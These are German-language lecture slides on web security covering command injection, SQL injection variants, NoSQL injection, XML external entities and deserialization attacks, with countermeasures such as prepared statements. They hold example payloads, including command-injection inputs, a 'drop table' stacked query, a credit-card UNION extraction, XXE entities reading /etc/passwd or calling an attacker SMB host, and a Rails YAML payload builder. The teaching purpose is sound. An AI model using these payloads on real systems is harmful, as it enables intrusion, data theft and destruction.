---
author: Andreas Happe
title: Web Security
--- 

# Injection Attacks

## Grundproblem

* Garbage In/Garbage Out
* Never trust user (input)
* Switch von Daten-Context auf Befehls-Context
  * Ausführung mit Web-App oder Datenbank-Rechten
  * kann auch auf nicht-Webservern passieren

## Wie zu testen?

* Gut automatisiert testbar
  * Web Application Security Scanner
  * Tools für Spezialbereiche wie SQLi
 
## Lösung

* Überprüfung aller Eingaben
  * immer mit Bibliotheken da zu viele Möglichkeiten

* Quoting der Ausgaben/bei der Verwendung
  + teilweise automatisch durch Frameworks

* Sandboxing
  * to minimize impact

## Problem: große Angriffsfläche

* Computer Game Maps (CS, SC)
* Flickr-Javascript Injection
* QR-Codes / Nummerntaffeln


# Command Injections

## Allgemein

* Eine Web-Operation bietet eine Operation an
* diese wird über ein Systemkommando breitgestellt
* Angreifer versucht das Kommando zu "überladen"..
* .. und kann dadurch "eigene" Kommandos ausführen
* use-case: mit netcat eine Session/Listener aufmachen

## Beispiel: Router mit Ping

http://192.168.1.1/test_connectivity?domain=www.snikt.net

``` python
import os
domain = user_input()
os.system('ping ' + domain)
```

```
# Versuche mit:
;ls
$(ls)
`ls`

# Ergebnis:
ping www.snikt.net;ls
```

## Beispiel: TP-Link Router

* [Flash Instruction](https://openwrt.org/toh/tp-link/tl-wr703n)

## Gefährliche Funktionen

* Java
  * Runtime.exec(), getRuntime.exec(), ProcessBuilder.start()
* PHP
  * system, shell_exec, exec, proc_open, eval, passthru, proc_open, expect_open, ssh2_exec, popen
* Python
  * exec, eval, os.system, os.popen, subprocess.popen, subprocess.call

## Lösung

* Bibliotheken statt Kommandozeilenaufrufe verwenden
* z.B. Netzwerkbibliotheken statt ping aufrufen


# SQL-Injections

## Grundproblem (OWASP)

``` 
SQL injection errors occur when:
  * Data enters a program from an untrusted source.
  * The data used to dynamically construct a SQL query
```

## SQL: very basics

``` SQL
select column1, column2 from table1, table2
where column1 = ‘xyz’
order by column1 asc/desc
limit 1;
```

## SQL: UNION select

``` SQL
select column1, column22 from table1, table2
where conditions
order by column1 asc/desc
union all
select column3, column4 from table4, table5;
```

## SQL Injection Attacks

## Simples Beispiel

* Kino-Portal:
* Login: https://kino.local/login.php?username=ah&password=pw

Hintergrund: SQL Operation wird mit String Concat gebaut

``` Java
query = "select * from users ";
query = query + "where username = '" +username + "'";
query = query + " and password = '" +password +"' limit 1;
```

## Simples Beispiel

Angreifer wählt Passwort:

```
1’ or ‘1’=’1
```

Ergebnis:

``` SQL
select * from users 
where username = ‘ah‘ and password = ‘1’ or ‘1’ = ‘1’ limit 1;
```

## Stacked Queries

``` SQL

# URL
http://snikt.net/test.php?id=1

# Operation:
select * from articles where id=1

# Eingabe
1; drop table users; --

# Ergebnis
select * from articles where id=1;drop table users;--
```

## Union-Based SQLi

* Weboberfläche
* Ergebnis wird in einer Tabelle angezeigt

```
# Datenquelle:
select Name, Phone, Address FROM users where user_id=1
```

## Versuch, weitere Daten zu extrahieren

* Spaltenanzahl erraten

* Folgende Eingabe fuer id:

```
  1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

## Union-Based SQLi: Ergebnis:

``` sql
SELECT Name, Phone, Address FROM Users WHERE Id=1
UNION ALL
SELECT creditCardNumber,1,1 FROM CreditCardTable
```

## Error-based SQLi

Eine Datenbank-Fehlermeldung wird als Rückkanal verwendet

``` sql
# normal
select * from table where id = 1

# angriff
select * from table where id = (select username, password from users);

# fehlermeldung:
Cannot compare id (integer) with ["root", "password"]
```

## Beispiel: Boolean-based blind SQLi

* URL: http://snikt.net/show_user?id=1
* Annahmen:
  * Query: select * from users where id = 1;
  * id besitzt Injection-Lücke
  * Aber kein Ausgabekanal in der Seite

## Oracle wird festgestellt:

``` sql
# id: "1 or 1=0" -> user wird angezeigt
select * from users where id=1 or 1=0;

# id: "1 and 1=0" -> Kein Produkt wird angezeigt
select * from users where id=1 and 1=0;
```

## Beispiel: Auslesen der ersten Stelle eines Benutzernamens

``` sql
SELECT *
FROM Users
WHERE Id=1 AND ASCII(SUBSTRING(username,1,1))=97
```

## Bespiel: time-based SQLi

* Kein Antwortkanal verfügbar
* Eigentlich ein Side-Channel Attack über Timing
* Operation: http://www.example.com/product.php?id=10

``` sql
# id: "10 AND.."
select * from products where id=10
AND IF(version() like ‘5%’, sleep(10), ‘false’))--
```

## Tooling: SQLMap

* Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, HSQLDB and H2 database management systems.
* Full support for five SQL injection techniques: boolean-based blind, time-based blind, error-based, UNION query-based and stacked queries.

## Problem: Database-Escape

* MySQL, PostgreSQL und MSSQL erlauben es, Kommandos ausgehend von SQL auszuführen
* z.B. xp_cmdshell bei MSSQL

Postgresql (user muss db admin sein)

``` sql
postgres-# CREATE TABLE temp(t TEXT);
postgres-# COPY temp FROM '/etc/passwd';
postgres-# SELECT * FROM temp limit 1 offset 0;
```

## Gegenmaßnahmen

## Gegenmaßnahme: Prepared Statement

```java
String custname = request.getParameter("customerName");
String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";

PreparedStatement pstmt = connection.prepareStatement( query );

pstmt.setString( 1, custname);

ResultSet results = pstmt.executeQuery( );
```

## Gegenmaßnahme: Prepared Statements

``` php
$id = 1;
$sth = $DBH->prepare("SELECT * FROM juegos WHERE id = :id");
$sth->bindParam(':id', $id, PDO::PARAM_INT);
$STH->execute();
```

## Gegenmaßnahme: prepared statements

* Achtung: einige Felder können nicht mittels Stored Procedures abgebildet werden:
  * Tabellennamen
  * Spaltennamen
  * ASC/DESC
* In dem Fall: Whitelisting oder Query umbauen

## Gegenmaßnahme: prepared statements

* Vorteil von prepared statements: Logik bleibt in der Applikation

## Gegenmaßnahme: Escape Input Data

* Last-Resort
* Error-Prone
* Datenbank-spezifisch

## Stored Procedures?

* Können sicher sein, weil stored procedures meistens prepared statements verwenden
* Es gibt aber auch die Möglichkeit eines evals, deswegen muss man den stored procedure code ebenso testen

## ORMs sind automatisch sicher?

Am Beispiel sqlize

``` javascript
# example
models.Items.findAll({
  limit: '1',
})

# not so perfect
models.Items.findAll({
  limit: '1; DROP TABLE Items; --',
})
```

## NoSQL? MongoDB

``` javascript
# example
db.myCollection.find({
  active: true,
  $where: function() {
    return obj.credits - obj.debits < $userInput;
  }
});;
``` 

## NoSQL: Attack pattern

``` javascript
# attack: $userInput auf folgenden Wert setzen
(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})()

# schöner formattiert
(function(){
  var date = new Date();
  do{ curDate = new Date();}while(curDate-date<10000);
  return Math.max();
})()
```

# XML External Entities

## Grundproblem

* XML Dateien müssen serverseitig bearbeitet werden
* XML Parser sind komplex
* Es können Remote Ressourcen eingebunden werden

## Beispiel: reading files

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

## Beispiel: reading Shares

Es werden die Token des aktuellen Benutzers verwendet.

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "smb://www.attacker.com" >]>
<foo>&xxe;</foo>
```


## Beispiel: reading URLs

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://www.seite-gegen-das-verbotsgesetz.com/text.txt" >]>
<foo>&xxe;</foo>
```

## Beispiel: reading URLs

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://192.168.0.1/admin/do-something" >]>
<foo>&xxe;</foo>
```

## Beispiel: reading URLs

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin/do-something" >]>
<foo>&xxe;</foo>
```

## If lucky: PHP Expect Module

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<foo>&xee;</foo>
```

## Gegenmaßnahmen

* JSON/CSV sind keine "wirklichen" Alternativen
* Im Parser External Entities deaktivieren
* Wissen, wie der Parser funktioniert..

## Million Laughter Attacks

* DoS-Angriff gegenüber dem Speicher (RAM)
* Meistens über “explodierende” Strukturen
* [XML Security Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_Security_Cheat_Sheet.md)

# Serilization Attacks

## Was ist Serialisierung

![Picture](0x08_serialization.jpg){.stretch}

## Grundidee Angriff

* Angreifer modifiziert das serialisierte Objekt
* ..bringt den Deserialisierer zum Abstürzen
* ..kann das deserialisierte Objekt modifizieren
* ..kann potentiell Code ausführen

## Client-Side State

Am Beispiel [PHP](http://www.phpinternalsbook.com/php5/classes_objects/serialization.html)

```
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

# attack
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

## Java Serialization Attack

* Problem: Objekt wird erst deserialisiert und danach erst überprüft
* Falls ein Fehler bei der Deserialiserung passiert, dann wird dies zu spät abgefangen

``` Java
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
```

## Java Serilization Attack

``` Java
Set root = new HashSet();
Set s1 = root;
Set s2 = new HashSet();
for (int i = 0; i < 100; i++) {
  Set t1 = new HashSet();
  Set t2 = new HashSet();
  t1.add("foo"); // make it not equal to t2
  s1.add(t1);
  s1.add(t2);
  s2.add(t1);
  s2.add(t2);
  s1 = t1;
  s2 = t2;
}
```

## Schlimmer: Code Execution

* Über das deserilisierierte Objekt wird Code executed
* Die verwendete Klasse muss im Zielsystem bekannt sein
* Meistens werden Konstruktoren von häufigen Bibliotheken verwendet
* Liste von Vektoren, z. B. [ysoserial](https://github.com/frohoff/ysoserial)

## Ruby on Rails Serilialisierung

```ruby
code  = File.read(ARGV[1])

# Construct a YAML payload wrapped in XML
payload = <<-PAYLOAD.strip.gsub("\n", "&#10;")
<fail type="yaml">
--- !ruby/object:ERB
  template:
      src: !binary |-
            #{Base64.encode64(code)}
	    </fail>
	    PAYLOAD
```

## Java Serialization Attack: Controls

* Deserialiseriung nicht verwenden
* Austauschen des Deserialisierers mit Custom Serializer (look-ahead)
* Serialiserungsoperationen müssen authenticated und authorized sein
* Serialisierte Objekte müssen integritätsgeschützt werden

# FIN
